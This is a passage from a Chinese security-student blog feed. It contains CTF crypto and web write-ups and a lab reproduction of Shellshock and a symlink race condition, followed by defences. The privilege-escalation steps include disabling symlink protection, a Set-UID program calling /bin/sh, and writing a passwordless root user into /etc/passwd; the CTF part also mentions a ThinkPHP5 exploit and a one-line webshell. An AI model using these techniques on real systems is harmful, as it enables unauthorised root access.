language-python">list=[0x4c614360da93c0a041b22e537de151eb,0xc1fd731c6d60040369908b4a5f309f41,0x80fdc84bbb5ed9e207a21d5436efdcfd,0xb48d19bb99a7e6bb448f63b75bc92384,0x39eaf918a52fcaa5ed9195e546b021c1,0x795d6869f32db43ff5b414de3c235514,0xf59a054403f933c842e9c3235c136367,0xc80b37816048952a3c0fc9780602a2fa,0x810ecef68e945c3fe7d6accba8b329bd,0xcad06891e0c769c7b02c228c8c2c8865,0x470a96d253a639193530a15487fea36f,0x470a96d253a639193530a15487fea36f,0x4bdea6676e5335f857fa8e47249fa1d8,0x810ecef68e945c3fe7d6accba8b329bd,0xedbb7ab78cde98a07b9b5a2ab284bf0a,0x44b43e07e9af05e3b9b129a287e5a8df,0xa641c08ed66b55c9bd541fe1b22ce5c0,0xabed1f675819a2c0f65c9b7da8cab301,0x738c486923803a1b59ef17329d70bbbd,0x7e209780adf2cd1212e793ae8796ed7c,0xa641c08ed66b55c9bd541fe1b22ce5c0,0xa641c08ed66b55c9bd541fe1b22ce5c0,0x636a84a33e1373324d64463eeb8e7614,0x6ec65b4ab061843b066cc2a2f16820d5,0xa4a39b59eb036a4a8922f7142f874114,0x8c34745bd5b5d42cb3efe381eeb88e4b,0x5b1ba76b1d36847d632203a75c4f74e2,0xd861570e7b9998dbafb38c4f35ba08bc,0x464b7d495dc6019fa4a709da29fc7952,0x8eb69528cd84b73d858be0947f97b7cc,0xdd6ac4c783a9059d11cb0910fc95d4a,0x4b6b0ee5d5f6b24e6898997d765c487c,0xb0762bc356c466d6b2b8f6396f2e041,0x8547287408e2d2d8f3834fc1b90c3be9,0x82947a7d007b9854fa62efb18c9fd91f,0x8ddafe43b36150de851c83d80bd22b0a,0xc7b36c5f23587e285e528527d1263c8b,0x2a0816e8af86e68825c9df0d63a28381,0x63ce72a42cf62e6d0fdc6c96df4687e3]result=[]for i in range(0,len(list)):    if(i==0):        result.append(list[0])    else :        result.append(list[i]^result[i-1])for i in range(0,len(result)):    print(hex(result[i])[2:])</code></pre><p>输出再次在线解密即可：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116211723907.png" alt="" loading="lazy"></p><h3 id="babyRSA-广东海洋大学"><a href="#babyRSA-广东海洋大学" class="headerlink" title="babyRSA-广东海洋大学"></a>babyRSA-广东海洋大学</h3><p>在网上找的RSA已知明文攻击的轮子，sage在线解密：</p><pre><code class="line-numbers language-python">#from Crypto.Util.number import *import osimport hashlibimport gmpy2e = 6c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107n = 25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431kbits = 60 # x的未知bit数目m0 = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (m0 + x)^e - cf = f.monic()x0 = f.small_roots(X=2^kbits,beta=1)[0] # 在0 - 2^kbits范围内求解小根，beta为1和上述分析的beta一致，也就是对应factor为Nprint(x0)</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117092320165.png" alt="image-20221117092320165" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117092333377.png" alt="image-20221117092333377" loading="lazy"></p><h3 id="ezRSA-广东海洋大学"><a href="#ezRSA-广东海洋大学" class="headerlink" title="ezRSA-广东海洋大学"></a>ezRSA-广东海洋大学</h3><p>在线分解n=p**4，得到p：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117093454398.png" alt="image-20221117093454398" loading="lazy"></p><pre><code class="line-numbers language-python">import libnumn=62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561c=56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504p=89065756791595323358603857939783936930073695697065732353414009005162022399741phi_n=p**4-p**3e=65537d=libnum.invmod(e,phi_n)m=pow(c,d,n)print(libnum.n2s(m))</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117094203988.png" alt="image-20221117094203988" loading="lazy"></p><h3 id="easy-RSA-中国人民公安大学"><a href="#easy-RSA-中国人民公安大学" class="headerlink" title="easy_RSA-中国人民公安大学"></a>easy_RSA-中国人民公安大学</h3><p>已知部分p的RSA问题，找轮子，sage解密：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117110630996.png" alt="image-20221117110630996" loading="lazy"></p><pre><code class="line-numbers language-python">n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553p0 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857p_fake = p0 &lt;&lt; 200pbits = 512kbits = 200  pbar = p_fake &amp; (2^pbits-2^kbits)  print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))  f = x + pbar  x0 = f.small_roots(X=2^kbits, beta=0.5)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.3  print(hex(int(x0 + pbar)))</code></pre><pre><code class="line-numbers language-python">from Crypto.Util.number import *from gmpy2 import *import libnump0 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857p_fake = p0 &lt;&lt; 200print(hex(p_fake))p=0xfb14fd93d89af7d5313718a665b4dd20bc6263c565e01821963ea70ff55d57ab32e859d845d901392f25bb82633c4630e6218f3fff8b84c3ae1dc65ad6f3cc5dn=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553q=n//pc=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140e=0x10001phi_n=(p-1)*(q-1)d=libnum.invmod(e,phi_n)m=pow(c,d,n)print(long_to_bytes(m))</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117110717023.png" alt="image-20221117110717023" loading="lazy"></p><h3 id="Single-table-西南科技大学"><a href="#Single-table-西南科技大学" class="headerlink" title="Single table-西南科技大学"></a>Single table-西南科技大学</h3><p>由条件可知是，playfair密码，其中规则同一行找左边，同一列找上边，不同行不同列找对角，最后把X去掉：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117144537403.png" alt="image-20221117144537403" loading="lazy"></p><h3 id="Multi-table-西南科技大学"><a href="#Multi-table-西南科技大学" class="headerlink" title="Multi table-西南科技大学"></a>Multi table-西南科技大学</h3><pre><code class="line-numbers language-python">from string import ascii_uppercasefrom random import randint,shufflefrom binascii import b2a_hex,a2b_hexflag=&quot;UNCTF{}&quot;base_table=[&#39;J&#39;, &#39;X&#39;, &#39;I&#39;, &#39;S&#39;, &#39;E&#39;, &#39;C&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;L&#39;, &#39;U&#39;, &#39;K&#39;, &#39;Q&#39;, &#39;Y&#39;, &#39;F&#39;, &#39;N&#39;, &#39;V&#39;, &#39;T&#39;, &#39;P&#39;, &#39;O&#39;, &#39;G&#39;, &#39;A&#39;, &#39;H&#39;, &#39;D&#39;, &#39;W&#39;, &#39;M&#39;, &#39;B&#39;]table={}for i in range(26):    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]str=&#39;UNCTF&#39;out=&#39;SDCGW&#39;t=[base_table.index(str[0]),base_table.index(str[1]),base_table.index(str[2]),base_table.index(str[3]),base_table.index(str[4])]key=[]for j in range(0,4):    for i in range(26):        if(table[i][t[j]]==out[j]):            print(i)            key.append(i)            breakprint(key)x=0c=&quot;SDCGW{MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD}&quot;#UNCTF{WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER}m=&#39;&#39;for i in range(len(c)):    for j in range(0,26):        if(c[i]==table[key[x%4]][j]):            print(base_table[j],end=&#39;&#39;)            x+=1            break</code></pre><h3 id="ezxor-浙江师范大学"><a href="#ezxor-浙江师范大学" class="headerlink" title="ezxor-浙江师范大学"></a>ezxor-浙江师范大学</h3><p>流密码many-time-padding，参考博客<a href="https://4xwi11.github.io/posts/43deb916/，改轮子：" target="_blank" rel="noopener">https://4xwi11.github.io/posts/43deb916/，改轮子：</a></p><pre><code class="line-numbers language-python">import Crypto.Util.strxor as xoimport codecsimport numpy as npdef ischr(x):    if ord(&#39;a&#39;) &lt;= x &lt;= ord(&#39;z&#39;):        return True    if ord(&#39;A&#39;) &lt;= x &lt;= ord(&#39;Z&#39;):        return True    return Falsedef infer(p_index, p_pos):    if msg[p_index, p_pos] != 0:        return    msg[p_index, p_pos] = ord(&#39; &#39;)    for x in range(len(c)):        if x != p_index:            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ ord(&#39; &#39;)dat = []def get_space():    for t_index, x in enumerate(c):        res = [xo.strxor(x, y) for y in c if x != y]        f = lambda t_pos: len(list(filter(ischr, [s[t_pos] for s in res])))        cnt = [f(t_pos) for t_pos in range(len(x))]        for t_pos in range(len(x)):            dat.append((f(t_pos), t_index, t_pos))# 第十二行和第六行长度不一，末尾填充0就好了c = [codecs.decode(x.strip().encode(), &#39;hex&#39;) for x in open(&#39;C:\\ymj_file\\re-ctf\\22校内赛\ezxor\\a.txt&#39;, &#39;r&#39;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)get_space()dat = sorted(dat)[::-1]for w, index, pos in dat:    infer(index, pos)def know(p_index, p_pos, ch):    msg[p_index, p_pos] = ord(ch)    for x in range(len(c)):        if x != p_index:            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ ord(ch)# 需要手动更改的就是这个地方，按照意思，替换你确定的字母know(0, 4, &#39;h&#39;)know(0, 13, &#39;o&#39;)know(3, 13, &#39;p&#39;)know(3, 19, &#39;h&#39;)know(5, 24, &#39;e&#39;)know(5, 25, &#39; &#39;)know(5, 26, &#39;i&#39;)print(&#39;\n&#39;.join([&#39;&#39;.join([chr(c) for c in x]) for x in msg]))# 其实只需要知道一条正确的明文就够了，key=C1^M1key = xo.strxor(c[0], &#39;&#39;.join([chr(c) for c in msg[0]]).encode())print(key)</code></pre><h3 id="Fermat-西南科技大学"><a href="#Fermat-西南科技大学" class="headerlink" title="Fermat-西南科技大学"></a>Fermat-西南科技大学</h3><p>根据费马小定理，<br>$$<br>gift+x=x*p<br>$$</p><p>$$<br>x(p-1)=gift<br>$$</p><p>$$<br>2^{(p-1)}≡ 1;mod;p<br>$$</p><p>==&gt;<br>$$<br>p=gcd(2^{gift}-1,n)<br>$$</p><pre><code class="line-numbers language-python">import libnumfrom Crypto.Util.number import *from gmpy2 import *n = 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259gift = 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160m=pow(2,gift,n)-1a=mb=nr = a % bwhile r!=0:    a=b    b=r    r=a%bprint(b)p=bq=124404825607078034603149483270846649231000805906516561180420089586930900593352193075880169157349174090099399769277704379420461280611221204110761706560475928604607109520494407679757089325889840063141194554412310300922587311873405975863321941806225072354969183332411306641431067105413758457445734517375857368579e=0x10001phi_n=(p-1)*(q-1)d=libnum.invmod(e,phi_n)c=388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059m=pow(c,d,n)print(long_to_bytes(m))</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118092132508.png" alt="image-20221118092132508" loading="lazy"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="签到-吉林警察学院"><a href="#签到-吉林警察学院" class="headerlink" title="签到-吉林警察学院"></a>签到-吉林警察学院</h3><p>群里给了flag</p><h3 id="ezgame-浙江师范大学"><a href="#ezgame-浙江师范大学" class="headerlink" title="ezgame-浙江师范大学"></a>ezgame-浙江师范大学</h3><p>把血量改成0，重新加载html：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116202857997.png" alt="image-20221116202857997" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116202829711.png" alt="image-20221116202829711" loading="lazy"></p><h3 id="我太喜欢bilibili大学啦–中北大学"><a href="#我太喜欢bilibili大学啦–中北大学" class="headerlink" title="我太喜欢bilibili大学啦–中北大学"></a>我太喜欢bilibili大学啦–中北大学</h3><p>打开页面直接看到flag：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117123451675.png" alt="image-20221117123451675" loading="lazy"></p><h3 id="给你一刀-西南科技大学"><a href="#给你一刀-西南科技大学" class="headerlink" title="给你一刀-西南科技大学"></a>给你一刀-西南科技大学</h3><p>thinkphp5的漏洞，用莲花的exp：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093451420.png" alt="image-20221118093451420" loading="lazy"></p><p>getshell后得到一句话木马，post即可：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093253637.png" alt="image-20221118093253637" loading="lazy"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="社什么社-湖南警察学院"><a href="#社什么社-湖南警察学院" class="headerlink" title="社什么社-湖南警察学院"></a>社什么社-湖南警察学院</h3><p>搜索湖南著名景点，第一个就是：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117132904940.png" alt="image-20221117132904940" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117132832711.png" alt="image-20221117132832711" loading="lazy"></p><h3 id="magic-word-西南科技大学"><a href="#magic-word-西南科技大学" class="headerlink" title="magic_word-西南科技大学"></a>magic_word-西南科技大学</h3><p>winhex查看word的document.xml，</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117215857086.png" alt="image-20221117215857086" loading="lazy"></p><p>在线零宽字节解密：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117215940843.png" alt="image-20221117215940843" loading="lazy"></p><h3 id="找得到我吗-闽南师范大学"><a href="#找得到我吗-闽南师范大学" class="headerlink" title="找得到我吗-闽南师范大学"></a>找得到我吗-闽南师范大学</h3><p>同前面的题目，word改成zip后缀，找到document.xml查看即可：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093836905.png" alt="image-20221118093836905" loading="lazy"></p><h3 id="syslog-浙江师范大学"><a href="#syslog-浙江师范大学" class="headerlink" title="syslog-浙江师范大学"></a>syslog-浙江师范大学</h3><p>syslog找到密码：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118101406326.png" alt="image-20221118101406326" loading="lazy"></p><p>base64解密得到压缩包密码：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118101446316.png" alt="image-20221118101446316" loading="lazy"></p><p>打开压缩包即可。</p><h3 id="In-the-Morse-Garden-陆军工程大学"><a href="#In-the-Morse-Garden-陆军工程大学" class="headerlink" title="In_the_Morse_Garden-陆军工程大学"></a>In_the_Morse_Garden-陆军工程大学</h3><p>PDF转word文件可以看到：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118105222600.png" alt="image-20221118105222600" loading="lazy"></p><p>base64解密得到：</p><pre><code>依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡</code></pre><p>根据题目名字想到转换成摩斯电码解密：</p><pre><code>.-- .- -. ..--.- .- -. ..--.- -- .- -.- .- ..--.- -... .- -.- .- .- .- .- .- -.-.--</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118105303259.png" alt="image-20221118105303259" loading="lazy"></p><h3 id="zhiyin-中国人民公安大学"><a href="#zhiyin-中国人民公安大学" class="headerlink" title="zhiyin-中国人民公安大学"></a>zhiyin-中国人民公安大学</h3><p>winhex打开lanqiu.jpg，可知图片字节倒序：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118110239743.png" alt="image-20221118110239743" loading="lazy"></p><p>修复：</p><pre><code class="line-numbers language-python">f1=open(&quot;C:\ymj_file\\re-ctf\\22校内赛\zhiyin\\lanqiu.jpg&quot;,&#39;rb&#39;)f2=open(&quot;C:\ymj_file\\re-ctf\\22校内赛\zhiyin\\out.jpg&quot;,&#39;wb&#39;)f2.write(f1.read()[::-1])</code></pre><p>打开后得到Go_p1ay：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118112303821.png" alt="image-20221118112303821" loading="lazy"></p><p>winhex打开zhiyin.png，在最后看到摩斯密码，解密:</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118130508349.png" alt="image-20221118130508349" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118131655862.png" alt="image-20221118131655862" loading="lazy"></p><p>修复压缩包头，打开压缩包输入Go_p1ay_unc7f!!!即可：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118140927261.png" alt="image-20221118140927261" loading="lazy"></p>]]></content>
    
    
    <summary type="html">新生赛部分WP</summary>
    
    
    
    <category term="CTF" scheme="http://theffth.github.io/categories/CTF/"/>
    
    
    <category term="WP" scheme="http://theffth.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>shellshock &amp; race condition 原理与复现</title>
    <link href="http://theffth.github.io/2020/11/08/shellshock-race-condition-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://theffth.github.io/2020/11/08/shellshock-race-condition-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-11-08T14:32:10.000Z</published>
    <updated>2020-11-08T14:46:39.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shellshock漏洞"><a href="#shellshock漏洞" class="headerlink" title="shellshock漏洞"></a>shellshock漏洞</h2><p>Shellshock漏洞：GNU Bash 远程代码执行漏洞</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>首先安装一个有shellshock漏洞的bash，这里安装bash4.0，参考教程：</p><p>[]: <a href="https://blog.csdn.net/manshq163com/article/details/38079389" target="_blank" rel="noopener">https://blog.csdn.net/manshq163com/article/details/38079389</a></p><p>结果如下：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p1.png" alt="" loading="lazy"></p><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p3.png" alt="" loading="lazy"></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>利用shellshock漏洞需要满足的条件：</p><ul><li>bash版本需要满足小于4.3</li><li>使用export设置环境变量，并且环境变量的值以字符<code>&quot;(){&quot;</code>开头</li><li>启动新的shell（子进程）</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Bash允许在Bash的shell中使用环境变量来定义函数，如果环境变量的值以字符”( ){“开头，那么这个变量就会被当作是一个函数，当开启新的bash初始化环境变量时，会解析函数定义并执行。</p><h3 id="利用shellshock漏洞攻击Set-Uid程序"><a href="#利用shellshock漏洞攻击Set-Uid程序" class="headerlink" title="利用shellshock漏洞攻击Set-Uid程序"></a>利用shellshock漏洞攻击Set-Uid程序</h3><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p5.png" alt="" loading="lazy"></p><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>首先，我们编写一个Set-Uid程序，注意程序内需要设置uid与euid相同，这样才能保证后续成功提权，拿到root shell，程序内调用了system函数，system函数会继续调用fork()函数产生子进程，此时开启新的bash，对导入的环境变量foo进行解析，并执行<code>/bin/sh;</code>，从而得到root shell。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><pre><code class="line-numbers language-C">/* test.c */#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    printf(&quot;%d\n&quot;,getuid());    printf(&quot;%d\n&quot;,geteuid());    system(&quot;/bin/sh;&quot;);    return 0;}</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p4.png" alt="" loading="lazy"></p><p><code>sudo chmod 4755 xxx</code>设置用户的权限为：</p><p>文件所有者可读可写可执行，与文件所有者同属一个用户组的其他用户可读可执行，其它用户组可读可执行，同时，其他用户执行文件时，具有与所有者相当的权限。</p><h2 id="竞态条件漏洞"><a href="#竞态条件漏洞" class="headerlink" title="竞态条件漏洞"></a>竞态条件漏洞</h2><p>竞态条件是指一个系统或程序的输出结果取决于其他不可控制事件执行的时间顺序。当一个特权程序有竞态条件漏洞时，攻击者可以通过对其他时间的控制来影响特权程序的行为。</p><h3 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h3><h4 id="fs-protected-symlinks"><a href="#fs-protected-symlinks" class="headerlink" title="fs.protected_symlinks"></a>fs.protected_symlinks</h4><p>fs.protected_symlinks 用于限制普通用户建立软链接<br>0：不限制用户建立软链接<br>1：限制，允许用户建立软链接的情况是软链接所在目录是全局可读写目录或者软链接的uid与跟从者的uid匹配，又或者目录所有者与软连接所有者匹配</p><p>在本实验中我们需要提前关闭限制用户建立软链接的保护：</p><pre><code class="line-numbers language-bash">sudo sysctl -w fs.protected_symlinks=0</code></pre><h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p>/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：<br>用户名<strong>:</strong>口令<strong>:</strong>用户标识号<strong>:</strong>组标识号<strong>:</strong>注释性描述<strong>:</strong>主目录<strong>:</strong>登录Shell</p><h3 id="验证漏洞-1"><a href="#验证漏洞-1" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>编写漏洞程序vulp.c，并编译成Set-Uid程序：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p6.png" alt="" loading="lazy"></p><p>把root权限用户的信息写入文本文件passwd_input，该文件将作为vulp程序的输入，其中U6aMy0wojraho是空密码加盐后加密的结果：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p7.png" alt="" loading="lazy"></p><p>编写attack_process.c程序，由于我们关闭了系统禁止用户使用软链接的保护，因此可以把/tmp/Theffth文件接替链接到黑洞文件/dev/null和只有root用户权限才能写的/etc/passwd文件：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p8.png" alt="" loading="lazy"></p><p>最后，编写target_process.sh脚本，即不断尝试把root权限用户Hacker信息写入vulp程序，直到Hacker信息追加到/etc/passwd文件：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p9.png" alt="" loading="lazy"></p><p>最后，先执行attack_process程序，再执行target_process.sh脚本：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p10.png" alt="" loading="lazy"></p><p>可以看到成功修改了/etc/passwd文件，此时我们切换到Hacker，输入空密码即可得到root shell：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/p11.png" alt="" loading="lazy"></p><h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>操作系统进程调度的本质是时间片轮转，一个进程可能在任何时刻被调度，接着运行第二个程序。竞态条件漏洞利用了这种进程调度的特点，把一个程序中连续的两步打断，接着切换到另一进程，这个进程可能会对原来进程需要的资源进行修改，导致原程序的执行发生错误。上述例子中可以成功修改/etc/passwd文件的条件是：</p><ol><li>/tmp/Theffth文件软链接到/dev/null，同时vulp程序运行到access权限验证，由于我们可以向/dev/null中写入任意内容，验证通过</li><li>/tmp/Theffth文件接着链接到/etc/passwd，同时vulp程序接着运行到打开文件并写入passwd_input，此时Hacker用户的信息就被成功写入了本来只有root用户才能进行写操作的/etc/passwd文件</li></ol><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ul><li><p>打开系统禁止用户使用软链接的保护</p></li><li><p>使用最小用户权限，在access检查之前加入seteuid(getuid())：</p><p>程序进行access权限检查的意图就是为了防止非root用户利用Set-Uid程序对只有root用户才能进行修改的文件进行修改，如果我们可以保证Set-Uid程序的最小权限为普通用户的话，那么就不能对/etc/passwd等文件进行打开和写入操作</p></li></ul>]]></content>
    
    
    <summary type="html">Shellshock漏洞和竞态条件漏洞原理与复现过程</summary>
    
    
    
    <category term="漏洞分析" scheme="http://theffth.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="shellshock" scheme="http://theffth.github.io/tags/shellshock/"/>
    
    <category term="竞态条件漏洞" scheme="http://theffth.github.io/tags/%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode - 977 1365</title>
    <link href="http://theffth.github.io/2020/11/01/leetcode-977%201365/"/>
    <id>http://theffth.github.io/2020/11/01/leetcode-977%201365/</id>
    <published>2020-11-01T07:19:28.000Z</published>
    <updated>2020-11-01T07:29:13.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title="977. 有序数组的平方"></a><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/" target="_blank" rel="noopener">977. 有序数组的平方</a></h2><h3 id="first-try"><a href="#first-try" class="headerlink" title="first try"></a>first try</h3><pre><code class="line-numbers language-C++">class Solution {public:    vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; A) {    vector&lt;int&gt; result;    for(int i=0;i&lt;A.size();i++)    {        int tmp=A[i];        result.push_back(tmp*tmp);    }    sort(result.begin(),result.end());    return result;    }};</code></pre><h3 id="C-知识补充：范围for语句"><a href="#C-知识补充：范围for语句" class="headerlink" title="C++知识补充：范围for语句"></a>C++知识补充：范围for语句</h3><pre><code class="line-numbers language-C++">for(declaration : expression)    